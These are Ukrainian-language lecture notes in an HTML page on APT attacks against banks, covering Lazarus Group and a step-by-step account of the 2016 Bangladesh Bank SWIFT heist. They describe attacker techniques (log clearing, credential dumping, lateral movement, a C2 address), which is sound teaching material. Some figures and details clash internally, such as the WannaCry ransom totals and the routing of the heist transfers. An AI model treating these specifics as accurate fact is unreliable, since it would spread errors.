@@ -1,0 +1,1115 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Кіберзагрози в банківській сфері - Розширений конспект | Лекція 10</title>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="../../../../assets/css/base.css">
+    <link rel="stylesheet" href="../../../../assets/css/layout.css">
+    <link rel="stylesheet" href="../../../../assets/css/components.css">
+    <link rel="stylesheet" href="../../../../assets/css/konspekt.css">
+</head>
+<body>
+
+<!-- Reading Progress Bar -->
+<div class="reading-progress">
+    <div class="reading-progress-bar" id="progressBar"></div>
+</div>
+
+<!-- Header with Breadcrumbs -->
+<header class="header">
+    <div class="container">
+        <nav class="breadcrumb">
+            <a href="../../../../index.html">🏠 Головна</a>
+            <span class="breadcrumb-separator">→</span>
+            <a href="../../index.html">Модуль 4</a>
+            <span class="breadcrumb-separator">→</span>
+            <a href="index.html">Лекція 10</a>
+            <span class="breadcrumb-separator">→</span>
+            <span>Розширений конспект</span>
+        </nav>
+    </div>
+</header>
+
+<!-- Main Container -->
+<div class="konspekt-container">
+    <!-- Main Content -->
+    <main class="konspekt-page">
+        <div class="konspekt-header">
+            <h1 class="konspekt-title">Кіберзагрози в банківській сфері</h1>
+            <div class="konspekt-meta">
+                Лекція 10 • Модуль 4: Безпека банківських систем<br>
+                Розширений детальний конспект для спеціальності "Кібербезпека"
+            </div>
+        </div>
+
+        <div class="konspekt-content">
+            <!-- ========================================
+                 ТЕМА 1: APT ГРУПИ
+                 ======================================== -->
+            <h2 id="tema1">Тема 1: APT групи, що атакують банки</h2>
+
+            <div class="info-box">
+                <p><strong>📚 Огляд теми:</strong> У цій темі ми детально вивчимо Advanced Persistent Threats (APT) — найнебезпечніші кіберзлочинні групи, що атакують глобальну банківську інфраструктуру. Розглянемо три найвідоміші APT групи: Lazarus Group (Північна Корея), Carbanak (східноєвропейська група), та APT38 (спеціалізований підрозділ для SWIFT attacks). Проаналізуємо їхні тактики, техніки, процедури (TTPs), реальні кейси атак та методи захисту.</p>
+            </div>
+
+            <h3 id="apt-intro">1.1. Advanced Persistent Threats (APT) у фінансовому секторі</h3>
+
+            <h4>📖 Slide 1: Що таке Advanced Persistent Threat?</h4>
+
+            <p><strong>Advanced Persistent Threat (APT)</strong> — це термін, що описує висококваліфіковані, добре організовані та фінансовані кіберзлочинні групи або підрозділи, які проводять тривалі,  цілеспрямовані кампанії проти конкретних організацій або секторів економіки. Термін "Advanced" означає використання складних технік та інструментів, "Persistent" вказує на тривалість присутності в скомпрометованій мережі (місяці або навіть роки), а "Threat" підкреслює серйозність загрози для національної безпеки або економіки.</p>
+
+            <h5>🔍 Детальний розбір компонентів APT:</h5>
+
+            <p><strong>1. Advanced (Просунутий рівень):</strong></p>
+            <p>APT групи мають доступ до передових технологій та експертизи, що не доступні звичайним кіберзлочинцям. Це включає:</p>
+            <ul>
+                <li><strong>Zero-day експлойти:</strong> Використання невідомих вразливостей, для яких ще не випущено патчі. Наприклад, Lazarus Group використала zero-day в Adobe Reader для атаки на Bangladesh Bank. Такі експлойти коштують від $100,000 до $1+ млн на чорному ринку, що вказує на значне фінансування APT груп.</li>
+                <li><strong>Custom malware розробка:</strong> Створення унікального зловмисного ПЗ, яке не виявляється стандартними антивірусами. APT38 використовує malware сімейства HOPLIGHT, Manuscrypt, TYPEFRAME — всі є custom-built для специфічних цілей.</li>
+                <li><strong>Складні social engineering кампанії:</strong> Ретельно підготовлені spear-phishing атаки, де кожен email персоналізований для конкретної жертви на основі OSINT (Open Source Intelligence) даних.</li>
+                <li><strong>Supply chain компрометація:</strong> Атаки на software vendors або service providers для досягнення основної цілі (як SolarWinds incident).</li>
+            </ul>
+
+            <p><strong>2. Persistent (Постійна присутність):</strong></p>
+            <p>APT операції характеризуються тривалою присутністю в target мережі:</p>
+            <ul>
+                <li><strong>Довгострокова розвідка:</strong> APT групи можуть спостерігати за внутрішніми процесами банку місяцями перед виконанням основної атаки. Carbanak Group витратила в середньому 3-4 місяці на кожен банк, вивчаючи як працюють banking операції.</li>
+                <li><strong>Множинні механізми persistence:</strong> Встановлення декількох backdoors та persistence mechanisms на випадок виявлення одного з них. Наприклад: Registry Run keys, Scheduled Tasks, Windows Services, DLL hijacking.</li>
+                <li><strong>Living off the Land (LotL):</strong> Використання легітимних системних інструментів (PowerShell, WMI, PsExec) для уникнення детектування, що ускладнює відрізнення зловмисних дій від адміністративних.</li>
+                <li><strong>Command & Control (C2) infrastructure:</strong> Побудова надійної C2 інфраструктури з використанням DGA (Domain Generation Algorithms), fast-flux networks, або compromised legitimate websites як проксі.</li>
+            </ul>
+
+            <p><strong>3. Threat (Загроза):</strong></p>
+            <p>APT становлять критичну загрозу через:</p>
+            <ul>
+                <li><strong>Фінансові втрати:</strong> Прямі крадіжки можуть сягати десятків або сотень мільйонів доларів (Bangladesh Bank: $81M, Carbanak campaign: $1B+ total)</li>
+                <li><strong>Репутаційні збитки:</strong> Компрометація банку призводить до втрати довіри клієнтів, падіння акцій, втрати business partnerships</li>
+                <li><strong>Регуляторні наслідки:</strong> Штрафи від регуляторів, обов'язкові аудити, посилені compliance вимоги</li>
+                <li><strong>Системний ризик:</strong> Атака на велику фінансову установу може мати каскадний ефект на всю фінансову систему</li>
+            </ul>
+
+            <h5>🏦 Чому APT націлені саме на банки?</h5>
+
+            <div class="info-box">
+                <p><strong>Причини high targeting банківського сектору APT групами:</strong></p>
+                <ol>
+                    <li><strong>Пряма фінансова мотивація:</strong> Банки мають прямий доступ до грошових коштів через SWIFT, CBS (Core Banking Systems), ATM networks. APT групи можуть безпосередньо вкрасти кошти, на відміну від інших sectors де потрібно monetize вкрадені дані.</li>
+                    <li><strong>High-value targets:</strong> Одна успішна атака на банк може принести $10M-$100M, що набагато вигідніше ніж масові ransomware кампанії ($500K-$2M від великої корпорації)</li>
+                    <li><strong>Complexity створює вразливості:</strong> Банківська IT інфраструктура надзвичайно складна (legacy systems, Core Banking, SWIFT, payment gateways, mobile banking, integrations з партнерами), що створює більше attack surfaces</li>
+                    <li><strong>Regulatory pressure vs реальність:</strong> Попри строгі регуляції (PCI DSS, PSD2, NBU requirements), реальний security posture може бути слабким через:
+                        <ul>
+                            <li>Legacy systems (IBM mainframes з 1980-х часів, що досі working)</li>
+                            <li>Недостатнє security awareness навчання співробітників</li>
+                            <li>Обмежений security budget (2-4% від IT budget vs recommended 10-15%)</li>
+                            <li>Shortage кваліфікованих security specialists</li>
+                        </ul>
+                    </li>
+                    <li><strong>Геополітичні цілі:</strong> Для state-sponsored APT (як Lazarus) атаки на банки також мають геополітичне значення: дестабілізація економіки країни-противника, обхід міжнародних санкцій, фінансування власного режиму</li>
+                </ol>
+            </div>
+
+            <h5>🆚 APT vs Opportunistic Attacks: Ключові відмінності</h5>
+
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th>Характеристика</th>
+                        <th>APT Attacks</th>
+                        <th>Opportunistic Attacks (Cybercrime)</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Цілеспрямованість</strong></td>
+                        <td>Специфічна організація (e.g., Bangladesh Bank)</td>
+                        <td>Масові кампанії (тисячі випадкових targets)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Підготовка</strong></td>
+                        <td>Місяці розвідки, планування, custom malware</td>
+                        <td>Дні або тижні, використання commodity malware</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Тривалість</strong></td>
+                        <td>Місяці-роки присутності в мережі</td>
+                        <td>Години-дні (quick monetization)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Stealth</strong></td>
+                        <td>Максимальна прихованість, anti-forensics</td>
+                        <td>Мінімальний stealth (ransomware навіть оголошує себе)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Ресурси</strong></td>
+                        <td>Державне фінансування, команди specialists</td>
+                        <td>Невеликі кримінальні групи, обмежений бюджет</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Мотивація</strong></td>
+                        <td>Геополітична, стратегічна фінансова</td>
+                        <td>Швидка фінансова вигода</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Malware</strong></td>
+                        <td>Custom, zero-days, obfuscated</td>
+                        <td>Commodity (Zeus, Emotet), known signatures</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Приклад</strong></td>
+                        <td>Lazarus, Carbanak, APT38, Fancy Bear</td>
+                        <td>REvil ransomware, mass Emotet campaigns</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h5>🎯 Характеристики APT атак на банки (детально):</h5>
+
+            <div class="security-alert">
+                <h4>6 Ключових характеристик APT operations:</h4>
+
+                <p><strong>1. Цілеспрямованість (Targeted Nature):</strong></p>
+                <p>APT групи ретельно вибирають targets на основі:</p>
+                <ul>
+                    <li><strong>Вартості target:</strong> Великі commercial banks, central banks, або банки з високим SWIFT transaction volume</li>
+                    <li><strong>Уразливості security posture:</strong> Банки з відомими слабкостями (через попередні інциденти або OSINT)</li>
+                    <li><strong>Геополітичного значення:</strong> Банки в країнах-противниках або під санкціями</li>
+                    <li><strong>Технічної feasibility:</strong> Наявність attack vectors (outdated software, exposed services)</li>
+                </ul>
+                <p><em>Приклад:</em> Lazarus Group обрала Bangladesh Bank не випадково — це був central bank з direct connection до Federal Reserve Bank of New York через SWIFT, але з слабким cybersecurity (використання $10 second-hand network switches, no firewall між SWIFT та internal network).</p>
+
+                <p><strong>2. Тривалість (Duration):</strong></p>
+                <p>APT campaigns мають кілька фаз з різною тривалістю:</p>
+                <ul>
+                    <li><strong>Initial Reconnaissance:</strong> 2-4 тижні — OSINT збір даних про target, employees, infrastructure</li>
+                    <li><strong>Initial Access:</strong> 1-2 тижні — spear-phishing campaigns до досягнення initial foothold</li>
+                    <li><strong>Lateral Movement & Escalation:</strong> 1-3 місяці — поширення по мережі, компрометація domain controllers, досягнення критичних систем</li>
+                    <li><strong>Intelligence Gathering:</strong> 2-6 місяців — моніторинг як працюють banking systems (Carbanak використовував screen capture malware для спостереження за bank operators)</li>
+                    <li><strong>Mission Execution:</strong> 1-7 днів — фінальна фаза (SWIFT manipulation, ATM jackpotting)</li>
+                </ul>
+                <p>Загальна тривалість: <strong>3-12 місяців</strong> від initial access до cashout.</p>
+
+                <p><strong>3. Складність (Sophistication):</strong></p>
+                <p>APT operations використовують cutting-edge технології:</p>
+                <ul>
+                    <li><strong>Multi-stage malware:</strong> Dropper → Loader → Payload → Modules architecture для bypassing detection</li>
+                    <li><strong>Fileless malware:</strong> Code execution in memory (PowerShell, reflective DLL injection) без написання files на disk</li>
+                    <li><strong>Signed malware:</strong> Використання вкрадених або forged code-signing certificates для bypassing Application Whitelisting</li>
+                    <li><strong>Advanced obfuscation:</strong> Code encryption, polymorphic malware (кожен sample має різний hash)</li>
+                    <li><strong>Infrastructure diversity:</strong> C2 через Tor, compromised legitimate websites, CDN abuse для DGA domains</li>
+                </ul>
+                <p><em>Технічний приклад:</em> Lazarus HOPLIGHT malware використовує RC4 encryption для всіх network communications, dynamic API resolution (GetProcAddress) для hiding imports, та anti-debugging techniques (IsDebuggerPresent, CheckRemoteDebuggerPresent).</p>
+
+                <p><strong>4. Stealth & Anti-Forensics:</strong></p>
+                <p>APT групи докладають значних зусиль для уникнення детектування:</p>
+                <ul>
+                    <li><strong>Living off the Land:</strong> Використання built-in OS tools (PowerShell, WMIC, BITSAdmin, Certutil) замість dropping malware</li>
+                    <li><strong>Log deletion:</strong> Wevtutil.exe для clearing Windows Event Logs, SWIFT database log manipulation</li>
+                    <li><strong>Timestomping:</strong> Модифікація file timestamps (MACE: Modified, Accessed, Created, Entry modified) для hiding malware presence</li>
+                    <li><strong>Credential dumping:</strong> In-memory credential theft (Mimikatz, ProcDump на LSASS) не залишає artifacts на disk</li>
+                    <li><strong>Secure deletion:</strong> Використання Secure Delete (SDelete) або disk wiping для видалення traces</li>
+                </ul>
+                <p><em>Кейс Bangladesh Bank:</em> Після крадіжки Lazarus використала custom wiper malware для видалення logs та evidence з compromised systems, зробивши forensic investigation значно складнішою.</p>
+
+                <p><strong>5. Мотивація:</strong></p>
+                <p>APT групи мають різну мотивацію:</p>
+                <ul>
+                    <li><strong>Фінансова (financially-motivated APT):</strong>
+                        <ul>
+                            <li>Direct theft (SWIFT manipulation, ATM jackpotting)</li>
+                            <li>Funding state operations (Lazarus крадіжки фінансують DPRK nuclear program)</li>
+                            <li>Circumventing sanctions (North Korea під міжнародними sanctions)</li>
+                        </ul>
+                    </li>
+                    <li><strong>Геополітична (state-sponsored espionage):</strong>
+                        <ul>
+                            <li>Economic intelligence (stealing trade secrets, M&A plans)</li>
+                            <li>Destabilization (підрив довіри до banking system)</li>
+                            <li>Pre-positioning для potential cyber warfare</li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <p><strong>6. Ресурси та Організація:</strong></p>
+                <p>APT групи мають професійну структуру:</p>
+                <ul>
+                    <li><strong>Бюджет:</strong> $10M+ per year для top-tier APT groups (державне фінансування)</li>
+                    <li><strong>Команда:</strong>
+                        <ul>
+                            <li>Malware developers (10-20 осіб)</li>
+                            <li>Network penetration specialists (5-10 осіб)</li>
+                            <li>Social engineers (3-5 осіб)</li>
+                            <li>Infrastructure operators (для C2 management)</li>
+                            <li>Intelligence analysts (для target selection)</li>
+                            <li>Money mules network (для cashout operations)</li>
+                        </ul>
+                    </li>
+                    <li><strong>Infrastructure:</strong> Сотні servers по всьому світу для C2, bulletproof hosting providers, VPN chains</li>
+                </ul>
+            </div>
+
+            <h3 id="lazarus-group">1.2. Lazarus Group (Hidden Cobra) — Північнокорейська APT</h3>
+
+            <h4>📖 Slide 2-3: Профіль Lazarus Group</h4>
+
+            <p><strong>Lazarus Group</strong> (також відомий як <em>Hidden Cobra</em>, <em>TEMP.Hermit</em>, <em>Guardians of Peace</em>, <em>Whois Team</em>, <em>NewRomanic Cyber Army Team</em>) — це найбільш прибуткова та агресивна nation-state APT група, що працює від імені Демократичної Народної Республіки Корея (DPRK — North Korea). Група активна з принаймні 2009 року і відповідальна за вкрадені понад <strong>$2 мільярди</strong> з банків та crypto exchanges по всьому світу.</p>
+
+            <h5>🔍 Організаційна структура:</h5>
+
+            <div class="info-box">
+                <p>Lazarus Group є підрозділом <strong>RGB (Reconnaissance General Bureau)</strong> — головного розвідувального агентства Північної Кореї, яке підпорядковується безпосередньо лідеру DPRK Kim Jong Un. RGB має близько 6,000 співробітників та бюджет $200M+ на рік.</p>
+
+                <p><strong>Внутрішня структура Lazarus Group:</strong></p>
+                <ul>
+                    <li><strong>Lab 110 (Unit 110):</strong> Cyber warfare operations, espionage</li>
+                    <li><strong>Bluenoroff (APT38):</strong> Фінансові operations, SWIFT attacks, crypto theft — основний підрозділ для банківських атак</li>
+                    <li><strong>Andariel:</strong> South Korea-focused operations, military targeting</li>
+                    <li><strong>AppleJeus team:</strong> Cryptocurrency exchange targeting</li>
+                </ul>
+
+                <p><strong>Місцезнаходження операторів:</strong></p>
+                <ul>
+                    <li>Pyongyang, North Korea (primary base)</li>
+                    <li>Dalian, China (secondary offices, easier internet access)</li>
+                    <li>Southeast Asia offices (Malaysia, Vietnam) для operations</li>
+                </ul>
+            </div>
+
+            <h5>🎯 Цілі та мотивація Lazarus Group:</h5>
+
+            <p>Lazarus Group має dual mission:</p>
+            <ol>
+                <li><strong>Revenue Generation (Генерація доходу):</strong>
+                    <p>Північна Корея під суворими міжнародними sanctions (UN, USA, EU) які обмежують:</p>
+                    <ul>
+                        <li>Export coal, minerals, textiles</li>
+                        <li>Import oil, luxury goods</li>
+                        <li>Access to SWIFT banking network</li>
+                        <li>Foreign currency reserves</li>
+                    </ul>
+                    <p>Через неможливість normal economic activity, Lazarus використовує cyber theft як primary джерело foreign currency для:</p>
+                    <ul>
+                        <li>Фінансування nuclear і ballistic missile programs (estimated $1-2B per year needed)</li>
+                        <li>Підтримка elite lifestyle для Kim Jong Un та ruling class</li>
+                        <li>Покупка dual-use technologies через black market</li>
+                    </ul>
+                </li>
+                <li><strong>Strategic Objectives (Стратегічні цілі):</strong>
+                    <ul>
+                        <li>Espionage проти South Korea, USA, Japan</li>
+                        <li>Disruption attacks (Sony Pictures Entertainment 2014)</li>
+                        <li>Pre-positioning в critical infrastructure для можливого cyber warfare</li>
+                    </ul>
+                </li>
+            </ol>
+
+            <h5>📊 Lazarus Group: Профіль та статистика</h5>
+
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th>Параметр</th>
+                        <th>Деталі</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Походження</strong></td>
+                        <td>Північна Корея (DPRK), RGB (Reconnaissance General Bureau), Unit 110 та підрозділи</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Активність</strong></td>
+                        <td>З 2009 року (earliest known activity) по теперішній час</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Primary Targets</strong></td>
+                        <td>
+                            <ul style="margin: 0;">
+                                <li>Central та commercial banks (SWIFT access)</li>
+                                <li>Cryptocurrency exchanges (high liquidity)</li>
+                                <li>Defense contractors</li>
+                                <li>Media companies (Sony Pictures)</li>
+                                <li>Critical infrastructure (WannaCry targets)</li>
+                            </ul>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Мотивація</strong></td>
+                        <td>
+                            <strong>Primary:</strong> Financial gain для фінансування DPRK regime під sanctions<br>
+                            <strong>Secondary:</strong> Espionage, disruption, strategic pre-positioning
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Загальні збитки</strong></td>
+                        <td style="color: #e74c3c;"><strong>$2+ billion вкрадено</strong> (2009-2023), включно з:<br>
+                            • $81M - Bangladesh Bank (2016)<br>
+                            • $60M - NiceHash crypto exchange (2017)<br>
+                            • $250M+ - multiple crypto exchanges (2017-2018)<br>
+                            • Сотні мільйонів з інших banks та targets
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Malware Arsenal</strong></td>
+                        <td>
+                            <strong>Banking/SWIFT malware:</strong> HOPLIGHT, Manuscrypt, TYPEFRAME<br>
+                            <strong>Crypto stealers:</strong> AppleJeus, Celas Trade Pro, JMT Trading<br>
+                            <strong>Ransomware:</strong> WannaCry (2017, $8M ransom collected)<br>
+                            <strong>Wipers:</strong> Destover (Sony Pictures), Hermes<br>
+                            <strong>Loaders:</strong> PowerRatankba, RATANKBA<br>
+                            <strong>RATs:</strong> Fallchill, Volgmer
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Attribution Confidence</strong></td>
+                        <td>
+                            <strong>High confidence</strong> від US government (FBI, DHS, Treasury OFAC), UN Security Council reports, private security firms (FireEye, Kaspersky, Symantec). Attribution based on:<br>
+                            • Code overlap між campaigns<br>
+                            • C2 infrastructure reuse<br>
+                            • Operational patterns (working hours GMT+9, Korean holidays)</br>
+                            • Language artifacts (Korean strings в malware)<br>
+                            • Defector testimony (North Korean hackers defected to South Korea)
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h5>💰 Відомі Lazarus Operations (Timeline):</h5>
+
+            <div class="security-alert">
+                <h4>Хронологія major Lazarus attacks:</h4>
+
+                <pre class="code-block">
+<strong>2014:</strong>
+• Sony Pictures Entertainment hack
+  - Wiper malware Destover знищив 70% computer infrastructure
+  - Leak confidential emails, unreleased movies
+  - Motivation: фільм "The Interview" про assassination Kim Jong Un
+
+<strong>2015:</strong>
+• Banco del Austro, Ecuador
+  - $12 million украдено через SWIFT
+  - First known Lazarus banking attack
+
+<strong>2016 (February):</strong>
+• <strong>Bangladesh Bank heist — $81 million успішно</strong>
+  - Найбільша cyber theft в історії
+  - 35 fraudulent SWIFT messages на $951M (30 заблоковано)
+  - Використано SWIFT credentials compromise
+  - Детальний розбір нижче ↓
+
+<strong>2017 (May):</strong>
+• WannaCry ransomware pandemic
+  - 230,000+ computers у 150 countries заражено
+  - EternalBlue SMB exploit (stolen from NSA)
+  - Healthcare systems (UK NHS), logistics (FedEx, Maersk), telecom
+  - Estimated $4B+ economic damage
+  - Only $140K ransom collected (poor cashout strategy)
+
+<strong>2017 (June):</strong>
+• Far Eastern International Bank, Taiwan
+  - Attempt $60M theft (blocked by receiving banks)
+  - Similar TTPs to Bangladesh Bank
+
+<strong>2017 (December):</strong>
+• NiceHash cryptocurrency exchange, Slovenia
+  - $60M+ Bitcoin stolen (4,700 BTC at the time)
+  - Compromise через corporate network → access cold wallets
+
+<strong>2018 (January-October):</strong>
+• Banco de Chile
+  - $10M stolen
+  - Simultaneous DDoS attack for distraction
+  - Wiped bank computers для covering tracks
+
+<strong>2018:</strong>
+• Cryptocurrency exchange hacks (multiple)
+  - Coincheck (Japan): $530M stolen (largest crypto theft)
+  - Bithumb (South Korea): $30M
+  - Youbit (South Korea): Exchange bankrupt після attack
+
+<strong>2019:</strong>
+• Cryptocurrency campaigns expansion
+  - AppleJeus malware (fake crypto trading software)
+  - Supply chain attacks on crypto wallets
+
+<strong>2020-2023:</strong>
+• Continued crypto targeting
+  - DeFi platforms attacks
+  - NFT marketplace compromises
+  - Estimated $1B+ stolen в cryptocurrency за period
+                </pre>
+            </div>
+
+            <h4>📖 Slide 4: Bangladesh Bank Heist (2016) — Детальний Case Study</h4>
+
+            <p>Bangladesh Bank heist є найбільшою та найбільш документованою cyber theft в історії, що стала turning point для banking cybersecurity globally. Давайте розглянемо цю атаку у деталях.</p>
+
+            <div class="security-alert">
+                <h4>🚨 Bangladesh Bank Heist — $81 Million Theft</h4>
+                <p><strong>Target:</strong> Bangladesh Bank (Central Bank of Bangladesh)<br>
+                <strong>Attacker:</strong> Lazarus Group (APT38 subgroup)<br>
+                <strong>Date:</strong> February 4-5, 2016 (execution), January 2016 (initial access)<br>
+                <strong>Amount stolen:</strong> $81 million (successfully), attempted $951 million (total)<br>
+                <strong>Recovery:</strong> $0 (unrecovered, laundered через Philippines casinos)</p>
+            </div>
+
+            <h5>🔍 Детальна хронологія атаки:</h5>
+
+            <p><strong>Phase 1: Reconnaissance (грудень 2015 - січень 2016)</strong></p>
+            <ul>
+                <li><strong>Target selection:</strong> Bangladesh Bank обрано через:
+                    <ul>
+                        <li>Direct SWIFT connection до Federal Reserve Bank of New York (Bangladesh Bank foreign reserves account)</li>
+                        <li>Weak cybersecurity posture (виявлено через public information, OSINT)</li>
+                        <li>High transaction volume (регулярні міжнародні перекази)</li>
+                    </ul>
+                </li>
+                <li><strong>OSINT gathering:</strong>
+                    <ul>
+                        <li>LinkedIn профілі Bangladesh Bank IT staff (names, roles, email format)</li>
+                        <li>Job postings (revealing technologies used: Oracle DB, Windows servers)</li>
+                        <li>Public procurement documents (network equipment purchases)</li>
+                    </ul>
+                </li>
+                <li><strong>Infrastructure preparation:</strong>
+                    <ul>
+                        <li>Registration fake domains для phishing (bangladeshbank-*.com)</li>
+                        <li>Setup C2 servers (Singapore, Netherlands IP addresses)</li>
+                        <li>Development custom malware для SWIFT manipulation</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <p><strong>Phase 2: Initial Access (січень 2016)</strong></p>
+            <ul>
+                <li><strong>Spear-phishing campaign:</strong>
+                    <ul>
+                        <li>Targeted emails до Bangladesh Bank employees</li>
+                        <li>Subject: "Job Application" або "Invoice for Payment"</li>
+                        <li>Attachment: Malicious PDF document з embedded Adobe Reader exploit</li>
+                        <li>Social engineering: Email appears from legitimate recruitment agency або supplier</li>
+                    </ul>
+                </li>
+                <li><strong>Exploitation:</strong>
+                    <ul>
+                        <li>Employee відкриває PDF attachment</li>
+                        <li>Adobe Reader zero-day exploit executes (CVE-2015-8651 або similar)</li>
+                        <li>Dropper payload downloads stage 2 malware з C2</li>
+                    </ul>
+                </li>
+                <li><strong>Initial foothold:</strong>
+                    <ul>
+                        <li>Malware встановлюється на workstation</li>
+                        <li>Persistence через Registry Run key</li>
+                        <li>Callback до C2 server 103.246.242.202:443</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <p><strong>Phase 3: Lateral Movement & Escalation (січень - лютий 2016)</strong></p>
+            <pre class="code-block">
+<strong>Network Reconnaissance:</strong>
+1. Initial compromised host: BANGLADESH-BANK-WS-042 (employee workstation)
+2. Network scan виявляє:
+   - Domain Controller: 10.20.10.5
+   - Oracle Database Server: 10.20.20.15 (accounting system)
+   - SWIFT Alliance Access workstations: 10.20.30.10-15 (!!!)
+   - File Server: 10.20.40.20
+
+<strong>Lateral Movement Path:</strong>
+BANGLADESH-BANK-WS-042
+  → [credential dumping з browser saved passwords]
+  → Domain User "it_admin" credentials
+  → [PsExec до File Server 10.20.40.20]
+  → [Find admin credentials в shared folder]
+  → Domain Admin access!
+  → [Access Domain Controller]
+  → [Lateral movement до SWIFT workstations]
+
+<strong>Critical Discovery:</strong>
+- SWIFT Alliance Access workstations на SAME network як general corporate network
+- NO firewall між SWIFT zone та corporate network (major security flaw!)
+- SWIFT workstations running Windows 2008 R2 (unpatched)
+            </pre>
+
+            <p><strong>Phase 4: SWIFT System Compromise (лютий 1-3, 2016)</strong></p>
+            <ul>
+                <li><strong>SWIFT credentials theft:</strong>
+                    <ul>
+                        <li>Installation keylogger на SWIFT operator workstation</li>
+                        <li>Screen capture malware для recording SWIFT transactions</li>
+                        <li>Capture SWIFT Alliance Access login credentials</li>
+                        <li>Capture SWIFT message formats, beneficiary account templates</li>
+                    </ul>
+                </li>
+                <li><strong>Learning phase (critical!):</strong>
+                    <ul>
+                        <li>Attackers спостерігають 2-3 тижні як operators use SWIFT</li>
+                        <li>Note typical transaction amounts ($10M-$20M for reserves movements)</li>
+                        <li>Identify receiving banks (Federal Reserve Bank NY, Deutsche Bank, Pan Asia Bank)</li>
+                        <li>Understand approval workflows</li>
+                    </ul>
+                </li>
+                <li><strong>Malware customization:</strong>
+                    <ul>
+                        <li>Development custom malware для SWIFT database manipulation</li>
+                        <li>Ability to:
+                            <ul>
+                                <li>Create fraudulent MT103 messages (wire transfers)</li>
+                                <li>Delete records з SWIFT Alliance Access database</li>
+                                <li>Modify printer output (hide fraudulent confirmations)</li>
+                                <li>Suppress SWIFT software integrity checks</li>
+                            </ul>
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+
+            <p><strong>Phase 5: Execution — The Heist (February 4-5, 2016)</strong></p>
+
+            <div class="error-box">
+                <h4>⚠️ Attack Timeline — Thursday, February 4, 2016:</h4>
+                <pre class="code-block">
+<strong>23:00 Bangladesh Time (Thursday evening):</strong>
+- Bank closed for weekend (Bangladesh: Friday-Saturday weekend)
+- Minimal IT staff on duty
+- SWIFT workstation logged in (session kept active)
+
+<strong>23:30-01:00 (Night):</strong>
+<strong>Attackers execute the heist:</strong>
+
+1. Use stolen SWIFT credentials để login Alliance Access
+2. Create 35 fraudulent MT103 payment messages
+3. Destination: Federal Reserve Bank of New York
+4. Beneficiaries: Fake accounts у Philippines, Sri Lanka
+5. Total amount: <strong>$951 million</strong>
+
+<strong>Sample fraudulent message:</strong>
+MT103 (Single Customer Credit Transfer)
+From: Bangladesh Bank (Federal Reserve account)
+To: Banco del Austro (Ecuador)
+Amount: $12,000,000
+Beneficiary: Shalika Wije* (Sri Lanka)
+Reference: "Foreign reserve management"
+
+[34 more similar messages created]
+
+<strong>Malware actions:</strong>
+- Delete transaction records з SWIFT Alliance Access database
+- Modify printer drivers щоб hide confirmations
+- Clear event logs
+- Update SWIFT message sequence numbers (anti-detection)
+
+<strong>Friday, February 5, 2016:</strong>
+
+<strong>09:00 NY Time:</strong>
+- Federal Reserve Bank of NY receives 35 wire transfer requests
+- Total: $951 million
+- Automatic processing starts (SWIFT messages appear legitimate)
+
+<strong>First 5 transactions SUCCEED:</strong>
+✓ $20M → Pan Asia Bank, Manila, Philippines
+✓ $20M → Pan Asia Bank, Manila, Philippines
+✓ $20M → RCBC Bank, Manila, Philippines
+✓ $20M → RCBC Bank, Manila, Philippines
+✓ $1M → Sampath Bank, Sri Lanka
+<strong>Total transferred: $81 million</strong>
+
+<strong>10:30 NY Time — THE TYPO THAT SAVED $870M:</strong>
+Deutsche Bank (intermediary bank) receives request:
+  To: Shalika <strong>Fundation</strong> [sic], Sri Lanka
+  Amount: $20M
+
+Compliance officer notices spelling error "Fundation" (should be "Foundation")
+→ Raises alert as suspicious
+→ Contacts Federal Reserve Bank NY
+→ Fed freezes remaining 30 transactions ($870M saved!)
+
+<strong>Saturday, February 6:</strong>
+- Bangladesh Bank realizes something wrong (missing funds from account)
+- Weekend skeleton staff cannot immediately investigate
+- SWIFT Alliance Access logs show transactions but then disappear (malware)
+
+<strong>Monday, February 8:</strong>
+- Full incident response starts
+- Bangladesh Bank contacts Federal Reserve → confirm $81M transferred
+- Frantically attempts to recall funds
+- Too late — money already moved through Philippines banking system
+                </pre>
+            </div>
+
+            <p><strong>Phase 6: Money Laundering (February 5-15, 2016)</strong></p>
+
+            <pre class="code-block">
+<strong>Philippines Money Laundering Chain:</strong>
+
+February 5-9:
+1. $81M arrives at Pan Asia Bank та RCBC Bank (Manila)
+2. Immediately transferred до beneficiary accounts
+3. Beneficiaries: "William Go", "Enrico Teodoro Vasquez" (fake names)
+4. These accounts controlled by Lazarus-affiliated money mules
+
+February 9-12:
+5. Funds converted to Philippines Pesos (PHP)
+6. Cash withdrawn from accounts
+7. Money deposited in accounts of casino junket operators:
+   - Eastern Hawaii Leisure Company
+   - Solaire Resort & Casino
+   - Midas Casino
+
+February 12-15:
+8. Money "gambled" in casinos (money laundering technique)
+9. Casino chips exchanged for clean cash
+10. Cash smuggled out of Philippines
+
+<strong>Why Philippines?</strong>
+- Philippines casinos NOT covered by Anti-Money Laundering Act at the time
+- No reporting requirements for casino transactions
+- Secrecy laws protect casino customers
+- High cash economy
+- Junket operators facilitate money movement
+
+<strong>Recovery efforts:</strong>
